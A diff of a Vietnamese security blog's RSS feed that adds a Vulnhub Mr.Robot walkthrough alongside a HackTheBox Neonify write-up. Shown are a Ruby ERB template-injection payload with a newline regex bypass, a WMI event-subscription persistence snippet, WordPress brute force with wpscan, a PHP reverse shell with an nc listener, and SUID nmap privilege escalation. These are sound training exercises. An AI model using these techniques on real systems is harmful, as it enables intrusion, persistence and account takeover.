@@ -5,10 +5,10 @@
         <description>ctf - Tag - g03m0n</description>
         <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 10 Jun 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/tags/ctf/" rel="self" type="application/rss+xml" /><item>
     <title>Hackthebox - Neonify</title>
-    <link>https://g03m0n.github.io/posts/hackthebox-jscalc-copy/hackthebox-jscalc/</link>
+    <link>https://g03m0n.github.io/posts/hackthebox-neonify/hackthebox-neonify/</link>
     <pubDate>Mon, 10 Jun 2024 08:29:01 &#43;0800</pubDate>
     <author>g03m0n</author>
-    <guid>https://g03m0n.github.io/posts/hackthebox-jscalc-copy/hackthebox-jscalc/</guid>
+    <guid>https://g03m0n.github.io/posts/hackthebox-neonify/hackthebox-neonify/</guid>
     <description><![CDATA[<h2 id="description">Description</h2>
 <p>Link challenge tại <a href="https://app.hackthebox.com/challenges/Neonify" target="_blank" rel="noopener noreffer">đây</a>
 </p>
@@ -27,30 +27,6 @@
 <pre tabindex="0"><code>keke
 &lt;%= File.open(&#39;flag.txt&#39;).read %&gt;
 </code></pre><p>Endcode payload:</p>
-<p></p>
-<p>Chèn payload và gửi request:</p>
-<p></p>
-<p>Flag: <code>HTB{r3pl4c3m3n7_s3cur1ty}</code></p>
-]]></description>
-</item>
-<item>
-    <title>Hackthebox - Neonify</title>
-    <link>https://g03m0n.github.io/posts/hackthebox-neonify/hackthebox-neonify/</link>
-    <pubDate>Mon, 10 Jun 2024 08:29:01 &#43;0800</pubDate>
-    <author>g03m0n</author>
-    <guid>https://g03m0n.github.io/posts/hackthebox-neonify/hackthebox-neonify/</guid>
-    <description><![CDATA[<h2 id="description">Description</h2>
-<p>Link challenge tại <a href="https://app.hackthebox.com/challenges/Neonify" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<h2 id="step">Step</h2>
-<p>Đây là giao diện chính của challenge:</p>
-<p></p>
-<p>Đọc source code ta có thể thấy ứng dụng chạy bằng Ruby và sử dụng <a href="https://docs.ruby-lang.org/en/2.3.0/ERB.html" target="_blank" rel="noopener noreffer">ERB template</a>
- để render. Đây có thể sẽ là một bài SSTI Ruby ERB template
-Ngoài ra input còn bị regrex match với tất cả kí tự từ 0 tới 9, từ a tới z.</p>
-<p></p>
-<p>Ở đây regex sẽ chỉ match từ đầu tới cuối ở trong một dòng, tức là nếu chèn vào một string bất kì rồi dùng ký tự new line <code>(\n)</code> để xuống dòng, rồi chèn vào payload SSTI thì sẽ exploit thành công.
-Endcode payload:</p>
 <p></p>
 <p>Chèn payload và gửi request:</p>
 <p></p>
@@ -925,6 +901,73 @@ Payload</p>
 <p>$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = &lsquo;root/cimv2&rsquo;; Name = &ldquo;UPDATER&rdquo;; Query = &ldquo;SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA &lsquo;Win32_NTLogEvent&rsquo; AND Targetinstance.EventCode = &lsquo;4625&rsquo; And Targetinstance.Message Like &lsquo;%fakeuser%&rsquo;&rdquo;; QueryLanguage = &lsquo;WQL&rsquo;}
 $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = &ldquo;UPDATER&rdquo;; CommandLineTemplate = &ldquo;C:\Users\sec560\Desktop\payload.exe&rdquo;}
 $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}</p>
+]]></description>
+</item>
+<item>
+    <title>Vulhub - Mr.Robot</title>
+    <link>https://g03m0n.github.io/posts/vulhub-mrrobot/vulhub-mrrobot/</link>
+    <pubDate>Mon, 21 Aug 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/vulhub-mrrobot/vulhub-mrrobot/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link lab tại <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<h3 id="reconnaissance">Reconnaissance</h3>
+<p>Đầu tiên ta sử dụng <code>arp-scan</code> để quét các địa chỉ IP có trong dải mạng.
+Nhận thấy có một IP lạ là <code>192.168.134.136</code>.</p>
+<p></p>
+<p>Sử dụng <code>nmap</code> để kiểm tra các dịch vụ đang mở trên IP đó</p>
+<p></p>
+<p>Có thể thấy port 80 đang sử dụng <code>Apache httpd</code> và port 22 là <code>SSH</code>.</p>
+<h3 id="enumeration">Enumeration</h3>
+<p>Đầu tiên, truy cập vào endpoint <code>/robots.txt</code> ta có thể thấy <code>key 1/3</code> và một file <code>fsocity.dic</code>. Đây có thể là file từ điển để dùng cho một cuộc tấn công <code>brute force</code> nào đó.</p>
+<p></p>
+<p>Tiếp theo, sử dụng <code>nikto</code> tool để scan tất cả <code>dirrectories</code> của trang web.</p>
+<p></p>
+<p>Tìm thấy endpoint <code>/wordpress</code> =&gt; Trang web sử dụng Wordpress.
+Sử dụng <code>wpscan</code> để <code>brute force</code> username/password.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Ta truy cập endpoint <code>/fsocity.dic</code> để tải file từ điển về máy.
+Xử lý file để rút ngắn từ điển bằng <code>query</code>:</p>
+<pre tabindex="0"><code>cat fsocity.dic | sort -u &gt; dic.txt
+</code></pre><p></p>
+<p>Tiếp theo. ta đi tìm <code>username</code> bằng <code>query</code>:</p>
+<pre tabindex="0"><code>wpscan --url http://192.168.134.136 --enumerate u --users-list dic.txt
+</code></pre><p></p>
+<p>Tìm <code>password</code> với username vừa tìm được là <code>elliot</code>:</p>
+<pre tabindex="0"><code>wpscan --url http://192.168.134.136/ --usernames elliot --passwords dic.txt
+</code></pre><p>Ta thu được <code>username/password</code>: <code>elliot/ER28-0652</code></p>
+<p></p>
+<p>Vì Elliot là quản trị viên của trang WordPress nên có thể chỉnh sửa bất cứ điều gì.
+Tiến hành edit file <code>404.php</code> bằng <code>php-reverse-shell</code>:</p>
+<p></p>
+<p>Lắng nghe tại port <code>9001</code> ở máy attacker bằng <code>query</code>:</p>
+<pre tabindex="0"><code>nc -nvlp 9001
+</code></pre><p></p>
+<p>Refresh lại trang web như hình:</p>
+<p></p>
+<p>Reverse thành công.
+Tìm được <code>password</code> của user <code>robot</code> nhưng nó bị hash bằng <code>md5</code></p>
+<p></p>
+<p>Ta crack md5 tại <a href="https://crackstation.net/" target="_blank" rel="noopener noreffer">CrackStation</a>
+</p>
+<p></p>
+<p>Đăng nhập user <code>robot</code>.</p>
+<p></p>
+<p>Tìm được <code>key 2/3</code>.</p>
+<p></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>Ta tìm tất cả các file thực thi có quyền <code>suid</code> bằng <code>query</code>:</p>
+<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre><p></p>
+<p>Ta tìm được <code>/usr/local/bin/nmap</code>.
+Truy cập <a href="https://gtfobins.github.io/gtfobins/nmap/" target="_blank" rel="noopener noreffer">GTFOBins</a>
+</p>
+<p></p>
+<p><code>nmap --interactive</code> có thể được sử dụng để thoát ra khỏi các môi trường bị hạn chế bằng cách tạo ra một interactive system shell:</p>
+<p></p>
+<p>Tìm được <code>key 3/3</code>.</p>
 ]]></description>
 </item>
 </channel>
